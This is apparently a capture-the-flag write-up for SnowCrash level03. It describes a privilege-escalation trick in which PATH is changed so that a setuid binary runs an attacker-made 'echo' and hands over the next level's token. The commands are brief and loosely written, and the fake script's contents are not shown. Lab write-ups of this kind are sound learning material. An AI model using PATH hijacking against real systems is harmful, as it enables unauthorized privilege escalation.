# what we find 

this time there is a executable when we execute it a message appear 
    level03@SnowCrash:~$ ./level03
    Exploit me
# using ltrace 

bu using ltrace debuuger which let us to exploit and intercepts an records the dynamic library calls which are called by the executed process and signals which are received by that process

# what is PATH variable 

PATH is an environmental in linux and unix 

operating system which specifies all bin and sbin directories where executable programs are stored

we can override the PATH variable to point to a directory with your custom version of echo and since echo is executed using env, it isn't treated as a built-in.

If you notice ‘.’ in environment PATH variable it means that the logged user can execute binaries/scripts from the current directory and it can be an excellent technique for an attacker to escalate root privilege. This is due to lack of attention while writing program thus admin does not specify the full path to the program.

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

	vim echo 
	chmod 777 eho 
	echo $PATH 
	pwd
	export PATH=/home/user/level03:$PATH

    Finally, run the executable to get the token for level04:


        level03@SnowCrash:~$ ./level03
        Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXX
